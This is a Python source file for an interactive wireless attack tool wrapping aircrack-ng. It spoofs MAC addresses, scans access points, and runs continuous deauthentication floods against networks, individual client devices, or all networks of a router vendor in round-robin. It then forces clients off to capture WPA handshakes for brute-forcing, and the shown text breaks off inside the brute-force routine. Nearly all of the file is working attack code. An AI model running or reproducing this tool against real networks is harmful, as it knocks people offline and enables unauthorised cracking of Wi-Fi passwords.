#!/usr/bin/env python

import os
import re
import time
import glob
import random
import signal
import keyboard
import subprocess

selected_interface = ""
target_ap = ""
target_bssid = ""
target_channel = ""
target_device = ""
target_ap_authentication = ""
target_router_oui = ""
interface_mac_address = ""

terminals = ['x-terminal-emulator', 'gnome-terminal', 'konsole', 'xfce4-terminal']

terminal_pids = []
terminal_positions = [(0, 0), (0, 400), (0, 800), (800, 0), (800, 400),
                      (800, 800)]  # top-right, middle-right, bottom-right, top-left, middle-left, bottom-left


def get_screen_resolution():
    output = check_command_output("xdpyinfo | grep dimensions")
    resolution = output.split()[1].split('x')
    return int(resolution[0]), int(resolution[1])


def red(string):
    return f'\033[91m{string}\033[0m'


def green(string):
    return f'\033[92m{string}\033[0m'


def purple(string):
    return f'\033[95m{string}\033[0m'


def yellow(string):
    return f'\033[33m{string}\033[0m'


def blue(string):
    return f'\033[34m{string}\033[0m'


def magenta(string):
    return f'\033[35m{string}\033[0m'


def cyan(string):
    return f'\033[36m{string}\033[0m'


def white(string):
    return f'\033[37m{string}\033[0m'


def clear():
    subprocess.run('clear')


def run_command(command):
    result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    if result.returncode == 0:
        return result.stdout
    else:
        return result.stderr


def run_command_print_output(command):
    result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    print(f"Command: {command}")
    if result.returncode == 0:
        print(f"{green('Output')}   :   " + result.stdout)
        print("-" * 30)
        return result.stdout
    else:
        print(f"{red('Error')}      :   " + result.stderr)
        print("-" * 30)
        return result.stderr


def popen_command(command, killtime=0):
    print(f'running {command} for {killtime} seconds')
    process = subprocess.Popen(command, shell=True, preexec_fn=os.setsid, stdout=subprocess.PIPE,
                               stderr=subprocess.PIPE)
    if killtime:
        print(yellow(f'if process does not finish in {killtime} seconds, press enter to kill it'))
        time.sleep(killtime)
        os.killpg(process.pid, signal.SIGTERM)
        process.wait()
        output, error = process.communicate()
        output = output.decode('latin1')  # sometimes airodump output causes issues with utf-8
        error = error.decode('latin1')
        return output, error


def popen_command_new_terminal(command):
    for terminal in terminals:
        screen_width, screen_height = get_screen_resolution()
        terminal_width = screen_width // 2
        terminal_height = screen_height // 3

        try:
            if terminal == 'x-terminal-emulator':
                if not terminal_positions:
                    print("No more positions available for new terminals.")
                    continue
                position_index = len(terminal_pids) % 6
                x, y = terminal_positions[position_index]
                terminal_command = f"{terminal} -geometry {terminal_width}x{terminal_height}+{x}+{y} -e 'bash -c \"{command}; exec bash\"'"
            elif terminal == 'gnome-terminal':
                if not terminal_positions:
                    print("No more positions available for new terminals.")
                    continue
                position_index = len(terminal_pids) % 6
                x, y = terminal_positions[position_index]
                terminal_command = f"{terminal} --geometry=80x24+{x}+{y} -e '/bin/sh -c \"{command}; exec bash\"'"
                # terminal_command = f"{terminal} -e /bin/sh -c '{command}; exec bash'"
            elif terminal == 'konsole':
                terminal_command = f"{terminal} -e /bin/sh -c '{command}; exec bash'"
            elif terminal == 'xfce4-terminal':
                if not terminal_positions:
                    print("No more positions available for new terminals.")
                    continue
                position_index = len(terminal_pids) % 6
                x, y = terminal_positions[position_index]
                terminal_command = f"{terminal} --geometry=80x24+{x}+{y} -e '/bin/sh -c \"{command}; exec bash\"'"
                # terminal_command = f"{terminal} -e 'bash -c \"{command}; exec bash\"'"
            else:  # xterm
                terminal_command = f"{terminal} -e 'bash -c \"{command}; exec bash\"'"
            # print(f"Executing command: {terminal_command}\n")
            process = subprocess.Popen(terminal_command, shell=True, preexec_fn=os.setsid, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            terminal_pids.append(process.pid)
            return process

        except Exception as e:
            print(f"Failed to execute command in {terminal}: {e} \n")


def check_command_output(command):
    output = subprocess.check_output(command, shell=True, text=True)
    return output


def change_interface():
    global selected_interface
    print("Available Network Interfaces: \n")
    interfaces = run_command("iw dev | grep Interface | awk '{print $2}'").split('\n')
    select_with_number = []
    interface_count = 0
    for intf in interfaces:
        if intf != '':
            interface_count += 1
            select_with_number.append([interface_count, intf])
            print(f'{green(select_with_number[interface_count - 1][0])}) {select_with_number[interface_count - 1][1]}')
    while True:
        selection = input(f"\nEnter the number of the interface {green('(type exit to return)')} : ")
        if selection.lower() == 'exit':
            break
        elif selection.isnumeric():
            if interface_count >= int(selection) > 0:
                selected_interface = select_with_number[int(selection) - 1][1]
                get_mac_of_interface(selected_interface)
                break
            elif int(selection) > interface_count:
                print(f'Selected interface ({selection}) {red("does not exist")}')


def check_if_selected_interface_in_monitor_mode():
    interface_settings = run_command(f'iwconfig {selected_interface}')
    if 'monitor' in interface_settings.lower():
        return True
    else:
        return False


def switch_interface_to_monitor_mode(interface=selected_interface):
    print('Setting ' + interface + ' to monitor mode ')
    run_command(f'ifconfig {interface} down')
    run_command(f'iwconfig {interface} mode monitor')
    run_command(f'ifconfig {interface} up')


def switch_interface_to_managed_mode(interface=selected_interface):
    print('Setting ' + interface + ' to managed mode ')
    run_command(f'ifconfig {interface} down')
    run_command(f'iwconfig {interface} mode managed')
    run_command(f'ifconfig {interface} up')


def get_mac_of_interface(interface=selected_interface):
    global interface_mac_address
    output = run_command(f'ip link show {interface}')
    mac_address_search = re.search(r'link/\S+ (\w\w:\w\w:\w\w:\w\w:\w\w:\w\w)', output)
    if mac_address_search:
        interface_mac_address = mac_address_search.group(1)
    else:
        print(f'error with {magenta("get_mac_of_interface")}')


def spoof_mac_of_interface_with_random_byte(interface=selected_interface):
    global interface_mac_address
    print(f'current interface is {interface} and current MAC address is {interface_mac_address}')
    run_command_print_output(f'ip link set dev {interface} down')
    first_bit = ['2', '3', '4', '5', '6', '7', '8', 'a', 'b', 'c', 'd', 'e', 'f']
    second_bit = ['2', '4', '6', '8', 'c', 'e']
    first_octet = random.choice(first_bit) + random.choice(second_bit)
    random_mac = f'{first_octet}:' + ':'.join(f"{random.randint(0x00, 0xFF):02X}" for _ in range(5))

    print(f'randomly selected mac for {interface} is {random_mac}')
    run_command_print_output(f'ip link set dev {interface} address {random_mac}')
    # time.sleep(0.3)
    run_command(f'ip link set dev {interface} up')
    # time.sleep(0.3)
    get_mac_of_interface(selected_interface)


def output_ansi_management(output):
    """
    This function processes the raw output from airodump to extract only the most recent network information
    displayed on the terminal.

        Airodump updates the terminal view with new data by using ANSI escape codes, effectively refreshing the
        screen. Before each refresh, it uses a specific pattern '\x1b[0K\n\x1b[0J\x1b[2;1H\x1b[22m\x1b' to clear
        the previous information, and this function uses this pattern to identify and retain only the latest data.
        Similarly, the end of the standard output is marked by another pattern '\x1b[0K\n\x1b[0J\x1b[?25h',
        which this function removes.

        Basically

        when I save the output from airodump using subprocess.Popen(..., stdout=subprocess.PIPE) and output =
        airodump.communicate() the output has all the information from airodump at second = 0 up to seconds = 10
        where I kill the process

        what we see on screen is an illusion of old text being deleted and new one being
        written to screen, but it's all done with ansi escape

        you can examine this with print(repr(output)), just printing the output with print(output) would look
        normal since terminal understands the ansi and hides the information beyond this pattern
        '\x1b[0K\n\x1b[0J\x1b[2;1H\x1b[22m\x1b'

        everything is fine when printing but this becomes a problem when I want to deal with the output variable like
        managing the data inside. that's why I only want the latest information visible to us on terminal screen

        '\x1b[0K\n\x1b[0J\x1b[?25h' this is the pattern at the end of the output file from and this
        '\x1b[0K\n\x1b[0J\x1b[2;1H\x1b[22m\x1b' is the start pattern for each new airodump refresh

        so if I get the all the data starting from latest '\x1b[0K\n\x1b[0J\x1b[2;1H\x1b[22m\x1b' up to
        '\x1b[0K\n\x1b[0J\x1b[?25h' it will return only the latest airodump refresh with no duplicates

        BUT THIS PATTERN ONLY APPLIES TO THE OUTPUT FILE RETRIEVED FROM get_airodump_output()

        and if we are dealing with output file retrieved from get_devices_in_AP_output() (a different output file
        from get_airodump_output())  the end pattern becomes '\x1b[0K\n\x1b[0K\x1b[1B\x1b[0J\x1b[?25h' if no devices
        exist, pattern changes too I made an end+start pattern format for possible scenarios



        Parameters:
        - output (str): The raw output from airodump.

        Returns:
        str: The processed output containing only the latest network information visible on the terminal.
    """

    if '\x1b[0K\n\x1b[0J\x1b[?25h' in output:

        if '\x1b[0K\n\x1b[0J\x1b[2;1H\x1b[22m\x1b' in output:
            start_pattern = '\x1b[0K\n\x1b[0J\x1b[2;1H\x1b[22m\x1b'
            end_pattern = '\x1b[0K\n\x1b[0J\x1b[?25h'
            end_index = output.rfind(end_pattern)
            start_index = output.rfind(start_pattern, 0, end_index)
            if end_index == -1 or start_index == -1:
                print('unknown pattern error 1')
                return
            else:
                cleaned_data = output[start_index:end_index]
                return cleaned_data

    if 'Probes\x1b[0K\n\x1b[0K\x1b[1B\x1b[0J\x1b[?25h' in output:
        if '\n\x1b[0K\x1b[1B\x1b[0J\x1b[2;1H\x1b[22m\x1b[37m' in output:
            start_pattern = '\n\x1b[0K\x1b[1B\x1b[0J\x1b[2;1H\x1b[22m\x1b[37m'
            end_pattern = 'Probes\x1b[0K\n\x1b[0K\x1b[1B\x1b[0J\x1b[?25h'
            end_index = output.rfind(end_pattern)
            start_index = output.rfind(start_pattern, 0, end_index)
            if end_index == -1 or start_index == -1:
                print('unknown pattern error 2')
                return
            else:
                return None

    if '\x1b[0K\n\x1b[0J\x1b[?25h' in output:
        if '\x1b[0K\n\x1b[0J\x1b[2;1H\x1b[22m\x1b' in output:
            start_pattern = '\x1b[0K\n\x1b[0J\x1b[2;1H\x1b[22m\x1b'
            end_pattern = '\x1b[0K\n\x1b[0J\x1b[?25h'
            end_index = output.rfind(end_pattern)
            start_index = output.rfind(start_pattern, 0, end_index)
            if end_index == -1 or start_index == -1:
                print('unknown pattern error 3')
                return
            else:
                cleaned_data = output[start_index:end_index]
                return cleaned_data


def scan_for_networks():
    clear()
    global target_ap
    global target_bssid
    global target_channel
    global target_ap_authentication
    output, error = popen_command(f'airodump-ng {selected_interface}', killtime=7)
    if output and 'Failed initializing wireless card(s)'.lower() not in output.lower():
        start_pattern = '\x1b[0K\n\x1b[0J\x1b[2;1H\x1b[22m\x1b'
        end_pattern = '\x1b[0K\n\x1b[0J\x1b[?25h'
        end_index = output.rfind(end_pattern)
        start_index = output.rfind(start_pattern, 0, end_index)
        if end_index == -1 or start_index == -1:
            print('unknown pattern error 1')
            return
        else:
            output = output[start_index:end_index]
        SSIDS = []
        ssid_counter = 0
        ssids_print_list = []
        for row in output.split('\n'):
            column = row.split()
            if len(column) >= 12 and not str(column[10]) == 'AUTH' and not str(column[10]) == 'PSK' and not str(column[10]) == ']['  and not str(
                    column[10]).startswith('<length:') and not str(column[10]).startswith('0>:'):
                ssid_counter += 1
                SSIDS.append([ssid_counter, column[10]])
                # print(f'{green(SSIDS[ssid_counter - 1][0])}) {SSIDS[ssid_counter - 1][1]}')
                if column[-3] == 'SAE':
                    authentication = red(column[-3])
                elif column[-3] == 'PSK':
                    authentication = yellow(column[-3])
                else:
                    authentication = ''
                ssids_print_list.append(f'{green(SSIDS[ssid_counter - 1][0])}) {SSIDS[ssid_counter - 1][1]} {authentication}')
        print('\n==================================================================================================\n')
        while 1:
            for i in ssids_print_list:
                print(i)
            print('\nif desired SSID is not listed, please return and scan again.')
            selection = input(f"\nEnter the number of the SSID {green('(type exit to return)')} : ")
            if selection == 'exit':
                break
            elif selection.isnumeric():
                if ssid_counter >= int(selection) > 0:
                    target_ap = SSIDS[int(selection) - 1][1]
                    while 1:
                        try:
                            target_bssid, target_channel, target_ap_authentication = get_bssid_and_station_from_ap()
                            return
                        except TypeError:
                            if input(f'\n\n{green("Press Enter to retry : ")}').lower() != '':
                                target_ap = ''
                                return
                    return
                elif int(selection) > ssid_counter:
                    print(f'Selected interface ({selection}) {red("does not exist")}')
    else:
        print(f'Scan was not successful due to {green(selected_interface)} being {red("DOWN")}')
        print(f'{red("AIRODUMP-NG STDOUT ::")}\n{red(str(output))}')


def get_bssid_and_station_from_ap():
    """
    now we are dealing with data like this

    this is the duplicate data in the output file. actual output variable has much more duplicates then just 3 mentioned here

    see the  output_ansi_management(output) functions documentation to see why that happens

    ['\x1b[0K\x1b[1B\x1b[0J\x1b[2;1H\x1b[22m\x1b[37m', 'CH', '5', '][', 'Elapsed:', '0', 's', '][', '2024-03-02', '11:06', '\x1b[0K']
    ['\x1b[0K\x1b[1B', 'BSSID', 'PWR', 'Beacons', '#Data,', '#/s', 'CH', 'MB', 'ENC', 'CIPHER', 'AUTH', 'ESSID\x1b[0K']
    ['\x1b[0K\x1b[1B', 'BSSID', '-31', '4', '0', '0', '3', '360', 'WPA3', 'CCMP', 'SAE', 'ESSID', '\x1b[0K']
    ['\x1b[0K\x1b[1B', 'BSSID', 'STATION', 'PWR', 'Rate', 'Lost', 'Frames', 'Notes', 'Probes\x1b[0K']
    ['\x1b[0K\x1b[1B\x1b[0J\x1b[2;1H\x1b[22m\x1b[37m', 'CH', '5', '][', 'Elapsed:', '0', 's', '][', '2024-03-02', '11:06', '\x1b[0K']
    ['\x1b[0K\x1b[1B', 'BSSID', 'PWR', 'Beacons', '#Data,', '#/s', 'CH', 'MB', 'ENC', 'CIPHER', 'AUTH', 'ESSID\x1b[0K']
    ['\x1b[0K\x1b[1B', 'BSSID', '-31', '4', '0', '0', '3', '360', 'WPA3', 'CCMP', 'SAE', 'ESSID', '\x1b[0K']
    ['\x1b[0K\x1b[1B', 'BSSID', 'STATION', 'PWR', 'Rate', 'Lost', 'Frames', 'Notes', 'Probes\x1b[0K']
    ['\x1b[0K\x1b[1B\x1b[0J\x1b[2;1H\x1b[22m\x1b[37m', 'CH', '5', '][', 'Elapsed:', '0', 's', '][', '2024-03-02', '11:06', '\x1b[0K']
    ['\x1b[0K\x1b[1B', 'BSSID', 'PWR', 'Beacons', '#Data,', '#/s', 'CH', 'MB', 'ENC', 'CIPHER', 'AUTH', 'ESSID\x1b[0K']
    ['\x1b[0K\x1b[1B', 'BSSID', '-31', '4', '0', '0', '3', '360', 'WPA3', 'CCMP', 'SAE', 'ESSID', '\x1b[0K']
    ['\x1b[0K\x1b[1B', 'BSSID', 'STATION', 'PWR', 'Rate', 'Lost', 'Frames', 'Notes', 'Probes\x1b[0K']

    even though we have duplicates
    i can just say that `find where row[-2] == targetAP` return row[1],row[6] if len(row[1]) == 17`
    """

    def recursion():
        while 1:
            selection = input('Rerun the Scan  Y/N ').lower()
            if selection == 'y':
                return get_bssid_and_station_from_ap()
            elif selection == 'n':
                print(
                    '===============================================================================================\n')
                print(
                    f'this message is from {green("get_BSSID_and_Station_from_AP")} '
                    f'No {red("BSSID")} and {red("CHANNEL")} will be returned '
                    f'this may cause issues if this function was called from another function \n')
                return None
            return

    clear()
    print(f'Gathering Information on {target_ap}')
    output, error = popen_command(f'airodump-ng -N {target_ap} {selected_interface}', killtime=3)
    if 'Failed initializing wireless card(s)' in output:
        print(f'Scan was not successful due to {green(selected_interface)} being {red("DOWN")}')
        print(f'{red("AIRODUMP-NG STDOUT ::")}\n{red(str(output))}')
        return
    elif target_ap not in output:
        print(
            f'Scan was successful but {green(target_ap)} is {red("not found")}.')
        recursion()
        return
    else:
        for column in output.split('\n'):
            row = column.split()
            if row[-2] and row[1]:
                if row[-2] == target_ap and len(row[1]) == 17:
                    return row[1], row[6], row[-3]


def deauth(interface=selected_interface, interval=0, time_limit=0):
    if interval:
        aireplay = popen_command_new_terminal(
            f'aireplay-ng --deauth 0 -a {target_bssid} --ignore-negative-one {interface}')
        interval_time = interval
        while interval_time > 0:
            print(
                f"Deauthenticating {green(target_ap)}. Remaining time {green(interval_time)} Press Q repeatedly to cancel")
            if keyboard.is_pressed('q'):
                print("Loop canceled by user.")
                interval_time = 1
            time.sleep(1)
            interval_time -= 1
        try:
            os.killpg(aireplay.pid, signal.SIGTERM)
            aireplay.wait()

        except ProcessLookupError:
            print(f"IGNORE THIS ERROR IF EVERYTHING IS WORKING FINE {red(ProcessLookupError)}")
        return

    elif time_limit:
        aireplay = popen_command_new_terminal(
            f'aireplay-ng --deauth 0 -a {target_bssid} --ignore-negative-one {interface}')
        time.sleep(time_limit)
        try:
            os.killpg(aireplay.pid, signal.SIGTERM)
            aireplay.wait()
        except ProcessLookupError:
            print(
                f"This error occurs when airodump terminates unexpectedly {red(ProcessLookupError)}")
        return
    else:
        popen_command_new_terminal(f'aireplay-ng --deauth 0 -a {target_bssid} --ignore-negative-one {interface}')


def deauth_selected_device(interface, target_device, target_ap):
    aireplay = popen_command_new_terminal(f'aireplay-ng --deauth 0 -a {target_bssid} -c {target_device} {interface}')
    input(f'Deauthenticating {green(target_device)} in {green(target_ap)} press enter to return')
    aireplay.kill()

def get_airodump_output():
    def recursion():
        while 1:
            selection = input('Rerun the Scan  Y/N ').lower()
            if selection == 'y':
                return get_airodump_output()
            elif selection == 'n':
                print(
                    '===============================================================================================\n')
                print(
                    f'this message is from {green("get_airodump_output")} '
                    f'No {red("Output")} will be returned '
                    f'this may cause issues if this function was called from another function \n')
                return
    output, error = popen_command(f'airodump-ng {selected_interface}', killtime=10)
    if 'Failed initializing wireless card(s)'.lower() in output.lower():
        print(f'INTERFACE ERROR {red(output)}')
        recursion()
    else:
        return output



def get_airodump_output_oui_formatted():
    """
    th

    param interface
    """

    def recursion():
        while 1:
            selection = input('Rerun the Scan  Y/N ').lower()
            if selection == 'y':
                return get_airodump_output_oui_formatted()
            elif selection == 'n':
                print(
                    '===============================================================================================\n')
                print(
                    f'this message is from {green("get_airodump_output_OUI_formatted")} '
                    f'No {red("OUI_output")} will be returned '
                    f'this may cause issues if this function was called from another function \n')
                return
            return

    clear()
    print("OUIFormatter.sh is running. wait until it completes the scan (20s) ")

    shell = subprocess.run(f'./shell_scripts/OUIFormatter.sh {selected_interface}', shell=True, capture_output=True, text=True)
    oui_output, oui_output_error = shell.stdout, shell.stderr
    clear()
    if 'Failed initializing wireless card(s)'.lower() in oui_output.lower():
        print(f'INTERFACE ERROR {red(oui_output)}')
        recursion()
    if oui_output_error:
        print(
            f'there was a issue running {red("OUIFormatter.sh")} '
            f'check interface. if everything is okay rerun')
        print(f'ERROR {red(oui_output_error)}')

        print(oui_output)
        print(
            'an error occurred but If you see networks above then there is no problem (check above before the networks to see the error)')
        selection = input('Rerun the Scan  Y/N ').lower()
        while selection != 'y' or selection != 'n':
            if selection == 'y':
                get_airodump_output_oui_formatted()
            elif selection == 'n':
                return oui_output
    else:
        return oui_output


def scan_for_networks_by_oui_select_router(interface):
    oui_output = get_airodump_output_oui_formatted()
    print(oui_output)
    print('==================================================================================================\n')
    while 1:
        target_oui = input("Select an OUI from the output").replace(" ",
                                                                    "")
        if target_oui in oui_output and len(
                target_oui) == 8:

            return target_oui
        elif target_oui == '999':
            return
        else:
            print(len(target_oui))
            print(f'Selected OUI ({green(target_oui)}) does not exist. was it a mistype?')
            print(f'Type {green("999")} to cancel OUI selection')


def remove_ansi_escape_codes(input_text):
    ansi_escape = re.compile(r'\x1b\[[0-9;]*m')
    return ansi_escape.sub('', input_text)


def get_ssid_from_oui(output, target_oui):
    ssids = []
    lines = output.split('\n')
    current_oui = None
    for line in lines:
        if line.startswith("OUI:"):
            current_oui = line.split()[1]
        elif current_oui == target_oui and "{" in line:
            ssid_start_index = line.find("{") + 1
            ssid_end_index = line.find("}", ssid_start_index)
            ssid = line[ssid_start_index:ssid_end_index].strip()
            if ssid:
                ssids.append(ssid)
    return [ssid for ssid in ssids if ssid]


def deauth_by_oui(interface, target_oui):
    oui_output = get_airodump_output_oui_formatted(interface)
    oui_output = remove_ansi_escape_codes(oui_output)
    SSIDs_in_oui_output = get_ssid_from_oui(oui_output, target_oui)
    if SSIDs_in_oui_output:
        print(f"List of SSIDs in {target_oui}")
        for SSID in SSIDs_in_oui_output:
            print(f"{green(SSID)}")
        print("=====================================",
              " 1   : Deauth all SSIDs once and quit",
              " 2   : Deauth all SSIDs roundrobin",
              " 999 : Quit")
        while 1:
            selection = input("Choose an option : ")
            if selection == '999':
                return
            elif selection == '1':
                for SSID in SSIDs_in_oui_output:
                    deauth(interface, SSID, interval=True)
                return
            elif selection == '2':
                rr_counter = 0
                while 1:
                    for SSID in SSIDs_in_oui_output:
                        clear()
                        print(f"Deauthing {SSID}")
                        deauth(interface, SSID, interval=True)
                    rr_counter += 1
                    print(
                        f"each SSID in {green(target_oui)} has been Deauthenticated for {green(rr_counter)} times")
                    print(
                        f"moving to round {green(rr_counter + 1)} in 3 seconds. Press 'q' to cancel")
                    if keyboard.is_pressed('q'):
                        print("Loop canceled by user.")
                        return
                    time.sleep(3)
    else:
        print(f"No SSID found in f{target_oui}")
    return

def select_target_device():
    global target_device
    output, error = popen_command(f'airodump-ng -N {target_ap} -c {target_channel} {selected_interface}', killtime=5)
    devices = []
    for row in output.split('\n'):
        column = row.split()
        # print(repr(column))
        if len(column) >= 7 and str(column[0] == target_bssid) and len(column[1]) == 17:
            device = column[1]
            if device not in devices:
                devices.append(device)
    devices_print  = []
    counter = 0
    if devices:
        clear()
        for device in devices:
            counter += 1
            devices_print.append(f'{green(counter)} : {device}')
        while 1:
            for i in devices_print:
                print(i)
            selection = input("choose a target device : ")
            if selection.isnumeric():
                if counter >= int(selection) > 0:
                    target_device = devices[int(selection) - 1]
                    return
                elif int(selection) > counter:
                    print(f'Selected device ({selection}) {red("does not exist")}')
    else:
        input(f'No Device is connected to {green(target_bssid)} press enter to return')
        return
def deauth_devices_in_target_ap():
    output = popen_command('delete')
    # output = get_devices_in_ap_output()
    print(output)
    output = output_ansi_management(output)
    if output is None:
        print(
            f'If you see Airodump output above (BSSID,STATION,PWR,...) then the scan was successful '
            f'However it appears there are no devices connected to {green(target_ap)}')
        print(
            f'If you {red("dont")} see Airodump output '
            f'then there is a problem with {red("output_ansi_management")}')
        print(
            f'If that`s the case then uncomment the print(repr(output)) 3 lines above this message in the source code '
            f'and check the ansi escape output and check '
            f'if start/end pattern exist in {red("output_ansi_management")}')
        print(f'and contact me on {green("github")}')
        input(f'input anything to return to previous function \n')
        return

    if output and 'Failed initializing wireless card(s)'.lower() not in output.lower():
        devices = []

        for column in output.split('\n'):
            row = column.split()
            ''' AT THIS POINT the Data is formatted like this 
               ['\x1b[0K']                                                                                                                                                                                                                                 
               ['\x1b[0J\x1b[2;1H\x1b[22m\x1b[37m', 'CH', '3', '][', 'Elapsed:', '6', 's', '][', '2024-02-29', '19:08', '\x1b[0K']                                                                                                                         
               ['\x1b[0K\x1b[1B', 'BSSID', 'PWR', 'RXQ', 'Beacons', '#Data,', '#/s', 'CH', 'MB', 'ENC', 'CIPHER', 'AUTH', 'ESSID\x1b[0K']                                                                                                                  
               ['\x1b[0K\x1b[1B', 'TargetAP MAC address', '-28', '100', '55', '3', '0', '3', '360', 'WPA2', 'CCMP', 'PSK', '{targetAP}', '\x1b[0K']                                                                                               
               ['\x1b[0K\x1b[1B', 'BSSID', 'STATION', 'PWR', 'Rate', 'Lost', 'Frames', 'Notes', 'Probes\x1b[0K']                                                                                                                                           
               ['\x1b[0K\x1b[1B', 'TargetAP MAC address', 'Station of device(1) in target AP}', 'X', 'X', 'X', 'X','X']  
               ['\x1b[0K\x1b[1B', 'TargetAP MAC address', 'Station of device(2) in target AP}', 'X', 'X', 'X', 'X']  
               ['\x1b[0K\x1b[1B', 'TargetAP MAC address', 'Station of device(3) in target AP}', 'X', 'X', 'X', 'X','X','X'] maximum of 9 elements in a given row

               mac address is 17 chars long and in 2nd index of the row  

            '''
            if len(row) >= 3 and len(row[2]) == 17:
                devices.append(row[2])

        if devices:
            print(
                f'{green(str(len(devices)))} DEVICE MAC ADDRESS(ES) found on {green(target_ap)}')
            for device in devices:
                print(green(device))
            print("=====================================",
                  " 1   : Deauth all devices once and quit",
                  " 2   : Deauth all devices roundrobin",
                  " 999 : Quit")
            while 1:
                selection = input("Choose an option : ")
                if selection == '999':
                    return
                elif selection == '1':
                    for device in devices:
                        deauth_selected_device(interface, device, target_ap)
                    return
                elif selection == '2':
                    rr_counter = 0
                    while 1:
                        for device in devices:
                            clear()
                            print(f"Deauthing {device}")
                            deauth_selected_device(interface, device, target_ap)
                        rr_counter += 1
                        print(
                            f"each SSID in {green(device)} has been Deauthenticated for {green(rr_counter)} times")
                        print(
                            f"moving to round {green(rr_counter + 1)} in 3 seconds. Press 'q' to cancel")
                        if keyboard.is_pressed('q'):
                            print("Loop canceled by user.")
                            return
                        time.sleep(3)
    else:
        print('==================================================================================================\n')
        print(f'This message is from {green("deauth_devices_in_targetAP_with_interval")}')
        print(f'There is a problem with {red("get_devices_in_AP_output")}')
        input(f'input anything to return to previous function \n')
        return


def get_ssi_ds_with_psk_authentication_from_output(output):
    """
    can only be used with the output variable returned from get_airodump_output()
    :param output: variable returned from get_airodump_output()
    :return: list of SSIDs where authentication is 'PSK'
    """
    output = output_ansi_management(output)
    if output is None:
        print(f'there is a problem with f{red("output_ansi_management(output)")}')
        print(
            f'probably a new update to {green("aircrack-ng package")} '
            f'was made that changed the ansi pattern on stdout'
            f'or the pattern is not recognized in output_ansi_management(output)')
        print(f'Create a issue on {green("github")}.')
        input(f'input anything to return : ')
        return
    authentications = []
    for column in output.split('\n'):
        row = column.split()
        ''' AT THIS POINT the Data is formatted like this                                                                                                                
         ['BSSID', '-73', '2', '0', '0', '4', '130', 'WPA2', 'CCMP', 'PSK', 'ESSID, '\x1b[0K']
         ['BSSID', '-73', '2', '0', '0', '4', '130', 'WPA2', 'CCMP', 'PSK', 'ESSID, '\x1b[0K']
         ['BSSID', '-73', '2', '0', '0', '4', '130', 'WPA2', 'CCMP', 'PSK', 'ESSID, '\x1b[0K']
         ['BSSID', '-73', '2', '0', '0', '4', '130', 'WPA2', 'CCMP', 'PSK', 'ESSID, '\x1b[0K']

        '''
        if len(row) >= 12 and row[-3] == ('PSK' or 'psk'):
            authentications.append(row[-2])
    return authentications


def remove_files_with_prefix(directory, prefix):
    pattern = os.path.join(directory, prefix + '*')

    files_to_remove = glob.glob(pattern)

    for file_path in files_to_remove:
        try:
            os.remove(file_path)
            print(f"Removed {file_path}")
        except FileNotFoundError:
            print(f"File {file_path} was not found (it may have been removed already).")
        except Exception as e:
            print(f"Error removing {file_path}: {e}")
    return


def capture_handshake():
    def recursion():
        selection = input('\n Do you want to try again Y/N : ').lower()
        while 1:
            if selection == 'y':
                capture_handshake()
            elif selection == 'n':
                return
        return

    if target_ap_authentication == 'PSK':
        input(target_ap_authentication)
        clear()
        print(f'Running packet capture on {green(target_ap)}')
        print(
            f'Switching channel on  {green(selected_interface)} to {green(target_channel)}')
        switch_channel = subprocess.Popen(f'iwconfig {selected_interface} channel {target_channel}', shell=True)
        switch_channel.wait()

        target_directory = f'/tmp/{target_ap}-handshakeCapture'
        os.makedirs(target_directory, exist_ok=True)

        airodump_handshake_capture_location = f'/tmp/{target_ap}-handshakeCapture/{target_ap}'

        print(f'Writing Capture files to {yellow(target_directory)}')

        aireplay = popen_command_new_terminal(f'aireplay-ng --deauth 0 -a {target_bssid} {selected_interface}')

        airodump = popen_command_new_terminal(f'airodump-ng --bssid {target_bssid} -c {target_channel} -w {airodump_handshake_capture_location} {selected_interface}')

        time.sleep(30)

        os.killpg(airodump.pid, signal.SIGTERM)

        airodump_output = ''
        try:
            os.killpg(aireplay.pid, signal.SIGTERM)
            aireplay.wait()
        except ProcessLookupError:
            print('aireplay killed unexpectedly', ProcessLookupError)
        try:
            pattern = re.compile(r'handshake:')
            airodump_output, error = airodump.communicate()
            airodump.wait()
            match = pattern.search(airodump_output)
            if match:
                clear()
                print(f"\nHandshake capture {green('SUCCESSFUL')}")
                print(f"Handshake is saved in '/tmp/{target_ap}-handshakeCapture/'")
                input('input anything to return to network attacks menu')
                return

            else:
                clear()
                print(f'Handshake capture {red("FAILED")}')
                print(
                    'Remember that in order to capture the handshake '
                    'a device must try to connect to the target SSID')
                print(
                    'Reason for no handshake might be that no device was deauthenticated. '
                    'Try changing the timeout variable of this script in the source code')
                print(
                    'Or it might be that the deauthenticated devices did not try to reconnect to the SSID '
                    '(might happen if only a small amount of devices are connected to target SSID)')
                remove_files_with_prefix(f'/tmp/{target_ap}-handshakeCapture',
                                         f'{target_ap}')
                os.rmdir(f'/tmp/{target_ap}-handshakeCapture')
                recursion()
                return
        except ProcessLookupError:
            print('airodump killed unexpectedly', ProcessLookupError)
    else:
        clear()
        print('{target_ap_authentication} authentication is not supported for handshake capture')
        print('Only PSK authentication is supported for handshake capture')
        input(f"Press enter to return and select a AP that uses all use {yellow('PSK')} Authentication")
        return

def bruteforce_handshake_capture(interface, target_ap):
    """

    :param interface:
    :paramtarget_ap:
    :return:
    """
    BSSID, STATION = get_bssid_and_station_from_ap(interface, target_ap)

    search_pattern = f'/tmp/{target_ap}-handshakeCapture/{target_ap}*.cap'
    matches = glob.glob(search_pattern)
    if matches:
        while 1:
            clear()
            print(f'{green(len(matches))} captures for the {green(target_ap)} found')
            print(f'this software deletes the capture files that do not contain the handshake')
            print(
                f'so if the capture files were created using this software then all of the capture files should '
                f'contain the handshake\n')
            for match in matches:
                print(green(match))
            print('\n')

            print(
                f'If the handshake was captured using besside then the capture file is either {green(f"/tmp/{target_ap}-besside/wpa.cap")} or {green(f"/tmp/{target_ap}-besside/wep.cap")}')
            print(
                f'If you dont know which one to use then open them using {green("wireshark")} '
                f'only one of the files should have packets inside. Use the file with the packets \n')

            capture_file_address = input(
                f'type the address of the .cap file to continue. for example /tmp/{target_ap}-handshakeCapture/{target_ap}-01.cap : ').strip()
            print(f"selected capture file address is : {green(capture_file_address)} ")
            selection = input("Type Y to continue Y ").lower()
            if selection == 'y':
                break
    else:
        while 1:
            clear()
            print(f'No Capture file found in /tmp/{target_ap}-handshakeCapture for {green(target_ap)}')
            print(f'type the address of the .cap file to continue')
            print(
                f'Or type 999 to return to Network attacks menu '
